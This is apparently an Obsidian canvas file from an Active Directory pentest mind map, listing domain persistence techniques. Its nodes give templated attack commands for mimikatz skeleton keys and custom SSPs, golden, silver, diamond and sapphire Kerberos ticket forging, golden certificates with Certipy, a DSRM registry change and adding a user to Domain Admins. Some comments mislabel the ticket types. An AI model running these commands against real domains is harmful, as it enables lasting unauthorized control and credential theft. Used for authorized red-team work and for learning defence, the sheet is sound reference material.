{
	"nodes":[
		{"id":"d7ba20756de45bdf","type":"group","x":-2200,"y":-2880,"width":2840,"height":4880,"color":"#a5e178","label":"PERSISTANCE"},
		{"id":"f197fae6327c6531","type":"group","x":-3520,"y":-820,"width":1080,"height":760,"label":"NO CREDENTIALS"},
		{"id":"e6a764cb19c033b1","type":"text","text":"# PERSISTANCE","x":-2080,"y":-365,"width":280,"height":50,"color":"#a5e178"},
		{"id":"9c7c237a39295847","type":"text","text":"# Custom SSP\n\n>[!info] Theory\n>- https://www.sentinelone.com/blog/how-attackers-exploit-security-support-provider-ssp-for-credential-dumping/\n\n>[!example] Tools\n>-  [Mimikatz](https://github.com/gentilkiwi/mimikatz)\n\n```shell\n# Create custom ssp\n⚫ mimikatz \"privilege::debug\" \"misc::memssp\" \"exit\"\n```","x":-1360,"y":-310,"width":1840,"height":420},
		{"id":"d2f4ae1eee2d9d21","type":"text","text":"# Golden certificate\n\n>[!info] Theory\n>-https://www.thehacker.recipes/ad/persistence/adcs/golden-certificate#theory\n\n>[!example] Tools\n>-  [Certipy](https://github.com/ly4k/Certipy#golden-certificates)\n\n```shell\n# Forge certificate and sign them with the CAcert private key\n⚫ certipy ca -backup -ca '<ca_name>' -username '<user>'@'<domain>' -hashes '<hash>'\n⚪ certipy forge -ca-pfx '<ca_private_key>' -upn '<user>'@'<domain>' -subject 'CN=<user>,CN=Users,DC=<CORP>,DC=<LOCAL>'\n\n```","x":-1360,"y":155,"width":1840,"height":460},
		{"id":"d1bb452c84241fd5","type":"text","text":"# Diamond ticket\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/#silver-tickets\n\n\n>[!example] Tools\n>- [Ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)\n\n\n\n```shell\n# Forge silver ticket\n🟣 ticketer.py -request -domain '<domain>' -user '<user>' -password '<password>' -nthash '<hash>' -aesKey '<aeskey>' -domain-sid '<domain_sid>'  -user-id '<user_id>' -groups '512,513,518,519,520' '<anyuser>'\n```","x":-1360,"y":655,"width":1840,"height":440},
		{"id":"e26ed177a4ca58e8","type":"text","text":"# ADD Domain Admin\n\n>[!info] Theory\n>- ?\n\n\n>[!example] Tools\n>- [Net command]()\n\n\n```shell\n# Add controlled user to DA group\n⚫ net group \"domain admins\" '<user_controlled>' /add /domain\n```","x":-1360,"y":-2780,"width":1840,"height":420},
		{"id":"4bf5f2a5278366bf","type":"text","text":"# Golden Ticket Forge\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden#golden-tickets\n\n\n>[!example] Tools\n>- [Ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)\n>- [Mimikatz](https://github.com/gentilkiwi/mimikatz)\n\n\n```shell\n# Forge golden ticket with mimiikatz\n🔵 mimikatz \"kerberos::golden /user:<admin_user> /domain:<domain> /sid:<domain-sid>/aes256:<krbtgt_aes256> /ptt\"\n# Forge golden ticket with impacket's ticketer\n🟣 ticketer.py -aesKey '<aeskey>' -domain-sid '<domain_sid>' -domain '<domain>' '<anyuser>'\n```","x":-1360,"y":-2320,"width":1840,"height":500},
		{"id":"8254240cbc0b1449","type":"text","text":"# Silver Ticket Forge\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/#silver-tickets\n\n\n>[!example] Tools\n>- [Ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)\n>- [Mimikatz](https://github.com/gentilkiwi/mimikatz)\n\n\n```shell\n# Forge golden ticket with mimiikatz\n🔵 mimikatz \"kerberos::golden /sid:<current_user_sid> /domain:<domain-sid> /target:<target_server> /service:<target_service> /aes256:<computer_aes256_key> /user:<any_user> /ptt\"\n# Forge golden ticket with impacket's ticketer\n🟣 ticketer.py -nthash '<machine_nt_hash>' -domain-sid '<domain_sid>' -domain '<domain>' '<anyuser>'\n```","x":-1360,"y":-1780,"width":1840,"height":480},
		{"id":"290d8ba801a37806","type":"text","text":"# Directory Service Restore Mode (DSRM)\n\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/persistence/dsrm#theory\n\n\n>[!example] Tools\n>- ?\n\n\n```shell\n#Commands\n🔵 PowerShell New-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name \"DsrmAdminLogonBehavior\" -Value 2 -PropertyType DWORD\n```","x":-1360,"y":-1245,"width":1840,"height":420},
		{"id":"f5ed59203720482c","type":"text","text":"# Skeleton Key\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/persistence/skeleton-key/#theory\n\n>[!example] Tools\n>-  [Mimikatz](https://github.com/gentilkiwi/mimikatz)\n\n```shell\n# Create master password with mimikatz with password set as mimikatz\n⚫ mimikatz \"privilege::debug\" \"misc::skeleton\" \"exit\"\n```","x":-1360,"y":-785,"width":1840,"height":420},
		{"id":"e80c8b9bfa6f0677","type":"text","text":"# Saphire Ticket\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/#silver-tickets\n\n\n>[!example] Tools\n>- [Ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)\n\n\n\n```shell\n# Forge golden ticket with impacket's ticketer\n🟣 ticketer.py -request -impersonate '<anyuser>' -domain '<domain>' -user '<user>' -password '<password>'  -nthash '<hash>' -aesKey '<aeskey>' -domain-sid '<domain_sid>'  'ignored'\n```","x":-1360,"y":1135,"width":1840,"height":440},
		{"id":"e0444fc764437290","type":"text","text":"# 🛠️ DC Shadow\n\n>[!info] Theory\n\n>[!example] Tools\n\n```shell\n#Commands\n```","x":-1360,"y":1635,"width":1840,"height":280},
		{"id":"cefa15b12263378f","type":"file","file":"INTERACTIVE-MAP.canvas","x":-3440,"y":-740,"width":920,"height":600}
	],
	"edges":[
		{"id":"ed31273a92c3011b","fromNode":"f197fae6327c6531","fromSide":"right","toNode":"d7ba20756de45bdf","toSide":"left"},
		{"id":"cb7c368eae33ed52","fromNode":"e6a764cb19c033b1","fromSide":"right","toNode":"e26ed177a4ca58e8","toSide":"left"},
		{"id":"8b2ddcf0ba030c05","fromNode":"e6a764cb19c033b1","fromSide":"right","toNode":"4bf5f2a5278366bf","toSide":"left"},
		{"id":"e52ab85df5e448c6","fromNode":"e6a764cb19c033b1","fromSide":"right","toNode":"8254240cbc0b1449","toSide":"left"},
		{"id":"5ca38d14b54d3617","fromNode":"e6a764cb19c033b1","fromSide":"right","toNode":"290d8ba801a37806","toSide":"left"},
		{"id":"d6f2b864d115b08b","fromNode":"e6a764cb19c033b1","fromSide":"right","toNode":"f5ed59203720482c","toSide":"left"},
		{"id":"a79526424ffc8f4c","fromNode":"e6a764cb19c033b1","fromSide":"right","toNode":"9c7c237a39295847","toSide":"left"},
		{"id":"743b680506216d55","fromNode":"e6a764cb19c033b1","fromSide":"right","toNode":"d2f4ae1eee2d9d21","toSide":"left"},
		{"id":"6e719985508f6ca3","fromNode":"e6a764cb19c033b1","fromSide":"right","toNode":"d1bb452c84241fd5","toSide":"left"},
		{"id":"a91f3d13ed73ef1b","fromNode":"e6a764cb19c033b1","fromSide":"right","toNode":"e80c8b9bfa6f0677","toSide":"left"},
		{"id":"3f060d0d8e86a16c","fromNode":"e6a764cb19c033b1","fromSide":"right","toNode":"e0444fc764437290","toSide":"left"}
	]
}